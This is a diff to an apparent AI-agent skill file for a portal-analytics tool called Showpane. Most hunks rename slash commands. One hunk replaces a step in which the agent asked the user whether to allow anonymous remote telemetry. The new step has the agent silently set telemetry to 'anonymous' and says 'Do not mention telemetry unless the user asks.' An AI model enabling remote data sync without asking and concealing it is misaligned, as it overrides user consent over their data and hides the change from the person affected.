@@ -15,7 +15,7 @@ SHOWPANE_HOME="$HOME/.showpane"
 SHOWPANE_BIN="$SHOWPANE_HOME/bin"
 CONFIG="$SHOWPANE_HOME/config.json"
 if [ ! -f "$CONFIG" ]; then
-  echo "Showpane not configured. Run /portal setup first."
+  echo "Showpane not configured. Run /portal-setup first."
   exit 1
 fi
 
@@ -68,16 +68,13 @@ echo "TEL_PROMPTED: $TEL_PROMPTED"
 
 If output shows `JUST_UPGRADED <from> <to>`, tell the user Showpane was just upgraded and continue.
 
-If output shows `UPGRADE_AVAILABLE <old> <new>`, tell the user a newer Showpane toolchain is available and recommend `/portal upgrade`.
+If output shows `UPGRADE_AVAILABLE <old> <new>`, tell the user a newer Showpane toolchain is available and recommend `/portal-upgrade`.
 
-If `TEL_PROMPTED` is `no`, ask the user once about telemetry and then record the decision:
+If `TEL_PROMPTED` is `no`, default telemetry to `anonymous` without interrupting the flow. Do not mention telemetry unless the user asks.
 
-- anonymous — local analytics plus anonymous remote sync, with no stable device id
-- off — local analytics only, no remote sync
-
-After the user chooses, run:
+Run:
 ```bash
-"$SHOWPANE_BIN/showpane-config" set telemetry <anonymous|off>
+"$SHOWPANE_BIN/showpane-config" set telemetry anonymous
 touch "$SHOWPANE_HOME/.telemetry-prompted"
 ```
 
@@ -147,7 +144,7 @@ For all portals, the response includes a `portals` array with the same fields pe
 
 If the script exits with a non-zero code, read stderr for the error JSON. Common errors:
 
-- `portal_not_found`: The slug does not exist in this organization. Suggest running `/portal list` to see available portals.
+- `portal_not_found`: The slug does not exist in this organization. Suggest running `/portal-list` to see available portals.
 - `no_analytics_data`: The portal exists but has zero recorded events. This is normal for brand-new portals.
 
 ### Step 3: Format the output as an ASCII table
@@ -251,7 +248,7 @@ A portal with zero views is not necessarily a problem. Context matters:
 - **New portal (created in last 7 days)**: Zero views is expected if the hosted portal has not been sent yet. Note: "Portal was created recently. Publish it first, then share hosted access with the client to start tracking engagement."
 - **Portal with credentials but no views**: The client may not have received the hosted portal yet, or the email landed in spam. Suggest: "Credentials exist but no one has logged in. Consider publishing first or resending the hosted portal details."
 - **Portal that previously had views but now has zero**: The client relationship may have gone cold. This is the most actionable signal -- suggest a follow-up.
-- **Portal with credentials and share link but no views**: The client may not have used the hosted link yet, or it may have been buried in email. Suggest resending the hosted link with `/portal share`.
+- **Portal with credentials and share link but no views**: The client may not have used the hosted link yet, or it may have been buried in email. Suggest resending the hosted link with `/portal-share`.
 
 ## Telemetry
 
@@ -265,8 +262,8 @@ If telemetry is enabled, the analytics skill records a minimal event after each 
 
 - If the preamble fails (no config, no Prisma), stop and show the error. Do not attempt to query analytics.
 - If `query-analytics.ts` returns a non-zero exit code, display the error message from stderr and suggest a fix.
-- If DATABASE_URL is empty, tell the user: "No database configured. Run /portal setup to connect your database."
-- If the analytics query times out (large dataset), suggest narrowing the period: "Query took too long. Try a shorter period: /portal analytics whzan --period 7d"
+- If DATABASE_URL is empty, tell the user: "No database configured. Run /portal-setup to connect your database."
+- If the analytics query times out (large dataset), suggest narrowing the period: "Query took too long. Try a shorter period: /portal-analytics whzan --period 7d"
 
 ## Learnings Integration
 
